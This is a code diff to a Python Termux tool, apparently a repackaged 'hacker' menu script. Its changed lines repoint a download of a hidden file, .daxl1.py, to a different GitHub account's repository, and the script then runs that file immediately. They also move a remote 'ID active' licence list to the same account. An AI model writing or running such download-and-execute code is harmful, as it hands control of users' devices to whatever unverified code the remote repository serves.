@@ -227,7 +227,7 @@ def dwbara():
     if ia=="1":
         os.system("xdg-open https://t.me/Team1879")
         import wget, os
-        wget.download("https://raw.githubusercontent.com/zed404sfrr/-/main/.daxl1.py")
+        wget.download("https://raw.githubusercontent.com/matainsfr5sfr5sfro/3/main/.daxl1.py")
         os.system("python .daxl1.py")
     elif ia=="2":
     	import os,sys,wget
@@ -296,7 +296,7 @@ def hala():
         os.system('chmod 777 /data/data/com.termux/pain.txt ;figlet Id Tool ;echo ==============================')
         readid = open('/data/data/com.termux/pain.txt', 'r').read()
         print('Your ID : ' + str(readid))
-        textupload = requests.get('https://raw.githubusercontent.com/968hacker/list/main/list.txt').text
+        textupload = requests.get('https://raw.githubusercontent.com/matainsfr5sfr5sfro/id-active/main/id.txt').text
         if readid in textupload:
             print( '\x1b[37;1mYOUR ID IS ACTIVE....\x1b[0m')
             time.sleep(5)
